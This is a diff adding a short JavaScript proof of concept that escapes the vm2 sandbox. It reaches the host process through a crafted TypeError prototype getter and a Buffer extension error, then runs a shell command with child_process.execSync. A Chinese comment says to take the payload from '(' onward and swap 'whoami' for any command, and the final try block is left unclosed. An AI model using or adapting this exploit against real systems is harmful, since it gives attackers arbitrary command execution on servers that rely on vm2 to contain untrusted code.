@@ -1,0 +1,18 @@
+"use strict";
+const {VM} = require('vm2');
+const untrusted = '(' + function(){
+	TypeError.prototype.get_process = f=>f.constructor("return process")();
+	try{
+		Object.preventExtensions(Buffer.from("")).a = 1;
+	}catch(e){
+		return e.get_process(()=>{}).mainModule.require("child_process").execSync("whoami").toString();
+	}
+}+')()';
+try{
+	console.log(new VM().run(untrusted));
+}catch(x){
+	console.log(x);
+
+
+
+//截取 '(' 开始往后的内容，其中whoami替换为想要执行的语句
